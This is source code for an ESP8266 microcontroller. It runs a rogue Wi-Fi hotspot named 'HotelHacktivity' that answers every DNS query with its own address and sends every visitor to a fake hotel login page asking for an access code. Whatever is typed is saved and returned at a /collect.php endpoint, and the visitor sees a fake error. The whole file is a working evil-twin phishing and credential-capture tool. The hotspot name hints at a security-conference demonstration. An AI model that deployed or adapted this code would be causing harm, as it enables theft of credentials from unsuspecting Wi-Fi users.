#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String login = ""
"<!DOCTYPE html>"
"<html>"
"<head>"
"  <title>Login</title>"
"  <meta charset=\"utf-8\">"
"  <style>"
"    body {"
"      color: #FFFFFF;"
"      background: rgb(0, 132, 121);"
"      margin: 0px;"
"    }"
"    #header {"
"      padding: 30px;"
"      font-size: 40px;"
"      background: rgb(36, 35, 51);"
"    }"
"    #login {"
"      text-align:center;"
"      padding: 100px;"
"      background: rgb(0, 132, 121);"
"    }"
"    #submit {"
"      padding: 10px;"
"    }"
"  </style>"
"</head>"
"<body>"
"<div id=\"header\">"
"  <img src=\""
"data:image/jpeg;base64,"
"/9j/4AAQSkZJRgABAQEASABIAAD/4QecaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLwA8P3hw"
"YWNrZXQgYmVnaW49J++7vycgaWQ9J1c1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCc/Pgo8eDp4bXBt"
"ZXRhIHhtbG5zOng9J2Fkb2JlOm5zOm1ldGEvJz4KPHJkZjpSREYgeG1sbnM6cmRmPSdodHRwOi8v"
"d3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjJz4KCiA8cmRmOkRlc2NyaXB0aW9u"
"IHhtbG5zOmRjPSdodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyc+CiAgPGRjOmZvcm1h"
"dD5pbWFnZS9qcGVnPC9kYzpmb3JtYXQ+CiAgPGRjOnRpdGxlPgogICA8cmRmOkFsdD4KICAgIDxy"
"ZGY6bGkgeG1sOmxhbmc9J3gtZGVmYXVsdCc+eC1kZWZhdWx0PC9yZGY6bGk+CiAgIDwvcmRmOkFs"
"dD4KICA8L2RjOnRpdGxlPgogPC9yZGY6RGVzY3JpcHRpb24+CgogPHJkZjpEZXNjcmlwdGlvbiB4"
"bWxuczp4bXA9J2h0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8nPgogIDx4bXA6TWV0YWRhdGFE"
"YXRlPjIwMTUtMDQtMTZUMjM6Mzg6NDcrMDI6MDA8L3htcDpNZXRhZGF0YURhdGU+CiAgPHhtcDpN"
"b2RpZnlEYXRlPjIwMTUtMDQtMTZUMjE6Mzg6NTdaPC94bXA6TW9kaWZ5RGF0ZT4KICA8eG1wOkNy"
"ZWF0ZURhdGU+MjAxNS0wNC0xNlQyMzozODo0NyswMjowMDwveG1wOkNyZWF0ZURhdGU+CiAgPHht"
"cDpDcmVhdG9yVG9vbD5BZG9iZSBJbGx1c3RyYXRvciBDQyAoTWFjaW50b3NoKTwveG1wOkNyZWF0"
"b3JUb29sPgogPC9yZGY6RGVzY3JpcHRpb24+CgogPHJkZjpEZXNjcmlwdGlvbiB4bWxuczp4bXBN"
"TT0naHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyc+CiAgPHhtcE1NOkluc3RhbmNlSUQ+"
"eG1wLmlpZDphN2ExNWViYi00NTRiLTRiMzUtODU2ZC1hYTZiMjkwYjcyNDU8L3htcE1NOkluc3Rh"
"bmNlSUQ+CiAgPHhtcE1NOkRvY3VtZW50SUQgcmRmOnJlc291cmNlPSd4bXAuZGlkOmE3YTE1ZWJi"
"LTQ1NGItNGIzNS04NTZkLWFhNmIyOTBiNzI0NScgLz4KICA8eG1wTU06T3JpZ2luYWxEb2N1bWVu"
"dElEPnV1aWQ6NUQyMDg5MjQ5M0JGREIxMTkxNEE4NTkwRDMxNTA4Qzg8L3htcE1NOk9yaWdpbmFs"
"RG9jdW1lbnRJRD4KICA8eG1wTU06UmVuZGl0aW9uQ2xhc3M+cHJvb2Y6cGRmPC94bXBNTTpSZW5k"
"aXRpb25DbGFzcz4KICA8eG1wTU06RGVyaXZlZEZyb20gcmRmOnBhcnNlVHlwZT0nUmVzb3VyY2Un"
"CiAgIHhtbG5zOnN0UmVmPSdodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3Vy"
"Y2VSZWYjJz4KICAgPHN0UmVmOmluc3RhbmNlSUQ+eG1wLmlpZDo3NGRmMjU2Mi0zNzQyLTRmODEt"
"ODA0YS02NGYzNmUwYjc0ZmM8L3N0UmVmOmluc3RhbmNlSUQ+CiAgIDxzdFJlZjpkb2N1bWVudElE"
"PnhtcC5kaWQ6NzRkZjI1NjItMzc0Mi00ZjgxLTgwNGEtNjRmMzZlMGI3NGZjPC9zdFJlZjpkb2N1"
"bWVudElEPgogICA8c3RSZWY6b3JpZ2luYWxEb2N1bWVudElEPnV1aWQ6NUQyMDg5MjQ5M0JGREIx"
"MTkxNEE4NTkwRDMxNTA4Qzg8L3N0UmVmOm9yaWdpbmFsRG9jdW1lbnRJRD4KICAgPHN0UmVmOnJl"
"bmRpdGlvbkNsYXNzPnByb29mOnBkZjwvc3RSZWY6cmVuZGl0aW9uQ2xhc3M+CiAgPC94bXBNTTpE"
"ZXJpdmVkRnJvbT4KIDwvcmRmOkRlc2NyaXB0aW9uPgoKIDxyZGY6RGVzY3JpcHRpb24geG1sbnM6"
"aWxsdXN0cmF0b3I9J2h0dHA6Ly9ucy5hZG9iZS5jb20vaWxsdXN0cmF0b3IvMS4wLyc+CiAgPGls"
"bHVzdHJhdG9yOlN0YXJ0dXBQcm9maWxlPlByaW50PC9pbGx1c3RyYXRvcjpTdGFydHVwUHJvZmls"
"ZT4KIDwvcmRmOkRlc2NyaXB0aW9uPgoKIDxyZGY6RGVzY3JpcHRpb24geG1sbnM6cGRmPSdodHRw"
"Oi8vbnMuYWRvYmUuY29tL3BkZi8xLjMvJz4KICA8cGRmOlByb2R1Y2VyPkFkb2JlIFBERiBsaWJy"
"YXJ5IDkuMDA8L3BkZjpQcm9kdWNlcj4KIDwvcmRmOkRlc2NyaXB0aW9uPgoKPC9yZGY6UkRGPgo8"
"L3g6eG1wbWV0YT4KPD94cGFja2V0IGVuZD0ncic/Pgr/2wBDABALDA4MChAODQ4SERATGCgaGBYW"
"GDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8a"
"Gi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/"
"wgARCAA8ADwDAREAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAgUAAwQBBv/EABQBAQAAAAAA"
"AAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAAX4hNYAZkN4wBPCjcAMUD0fnDzZuMRtKjSMwTwo3FA3K"
"TYPzgjLQCwEuGYJ5YuKS0pNo/OCgIM4EXms4QhCEIdP/xAAiEAABBAEEAgMAAAAAAAAAAAACAAED"
"BBMFEBIxFBURITD/2gAIAQEAAQUCXsXVe3mUds5Bgt5l7F1Vs59n6VBUz4DR20zvbzRVaw0i80VW"
"sNIgnYwqTNNs/SobUFWJmi0zvaGwUyrWMqgmKZVrGRQSnMFSfK6fqmXEqCqlxGgqx8Y9M72zE4tP"
"9MRE2UvkCIngdy/L/8QAFBEBAAAAAAAAAAAAAAAAAAAAYP/aAAgBAwEBPwEB/8QAFBEBAAAAAAAA"
"AAAAAAAAAAAAYP/aAAgBAgEBPwEB/8QALBAAAQMBBgQFBQAAAAAAAAAAAgABEQMQEiEiUXIxM0GB"
"BCAjYqEwMjRhwf/aAAgBAQAGPwJcv5RZIutPFGTUsBbVHki608Vy/lFliPJV2qq/t4Kttsqdrfxw"
"RxSYYZcgUfpMMMjJvDjlRRTYI08lXbZV2qs2rKp2tJmohg0o8gtDdEUUgwR+mI3W6InGiGCPIwxp"
"ae1Vdqqv7VV2qq2rfx1U7W8tr0DGCJ2uDllh1wQ4A0lEXeCi6OZ4bD9oPtzT0TyzNDxh9L//xAAm"
"EAABAwMDAwUBAAAAAAAAAAABABEhEDFBYXHwUbHBIIGh0eGR/9oACAEBAAE/ITAWlUnlQQykolTe"
"QBaVSG63y9LlL0nvA9gmfqt4G9DYrifiN3HxlBpozr+KDyuMqNtuZH0j1sN1LlL6NiyB6fwVwN6G"
"xRhyLHLK+pByHA56os8h1LojHUowhhd1LiOxyxXpHtVWLljF8nhcDehsUIQJZKS7n+BOw48CbnNk"
"UgQ7J3dx0BiEi10N7dlCQiXad0GPHFci59DD1f/aAAwDAQACAAMAAAAQAggAkAEAEkAgkEAAEkEA"
"kAkAEgEgkEkg/8QAFBEBAAAAAAAAAAAAAAAAAAAAYP/aAAgBAwEBPxAB/8QAFBEBAAAAAAAAAAAA"
"AAAAAAAAYP/aAAgBAgEBPxAB/8QAJRABAAIBAgUFAQEAAAAAAAAAAQARITFREEFhgaFxkcHR8LHx"
"/9oACAEBAAE/EFY7Fz8T6iJRyK3o0lpFd4q602GEJHLrc2NOk/E+oChUsZrvobcPBZZvPKfM0J+D"
"Loos7jvHZ+Ocs3nj8B01XRP9AgEyRudrggkAosBTBmqzc34cEr0yuATN55sQSptlDlfQ24eC8PKf"
"MNCfi9YaNtZ2bf6B3nj8B02tEstQMYWyjvmALypexl0ud4CtDwygoYI6sPtLZ0AbrTx7X4jNf3K/"
"rh4LLI4zLqlQP6xXm5vmM+tYvel+JT8t5pKHGdHI9Y8fgOmORLw/o1rVA3VqGu8ugmtvsuZYIiBz"
"RSzL4FKXuoHbDua4v0M3Lznn7oGi4DNLgp3E2L6LSegt0dONG06BKNpRtKNuP//Z"
"\" width=\"60px\" height=\"60px\"> Hotel Hacktivity Wifi Service"
"</div>"
"<div id=\"login\">"
"  <h2>Please enter your access code:</h2>"
"  <form action=\"login2.php\" method=\"get\">"
"   <div>Access code: <input type=\"text\" name=\"code\" autofocus></div>"
"   <div id=\"submit\"><input type=\"submit\" value=\"Submit\"></div>"
"  </form>"
"</div>"
"</body>"
"</html>";

String sniffed = "";

void setup() {
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("HotelHacktivity");

  // if DNSServer is started with "*" for domain name, it will reply with
  // provided IP to all DNS request
  dnsServer.start(DNS_PORT, "*", apIP);

  // redirect all requests to the login page
  webServer.onNotFound([]() {
    webServer.sendHeader("Location", String("http://www.hotelhacktivity.com/login.php"), true);
    webServer.send ( 302, "text/plain", "");
  });
  
  webServer.on("/login.php", []() {
    webServer.send(200, "text/html", login);
  });

  webServer.on("/login2.php", []() {
    if(webServer.args() > 0 && webServer.argName(0) == "code") {
      sniffed += webServer.arg(0) + "\n";
      }
    webServer.send(200, "text/plain", "Error - unknown error occured, please try again later.");
  });

  webServer.on("/collect.php", []() {
    webServer.send(200, "text/plain", sniffed);
  });
  
  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
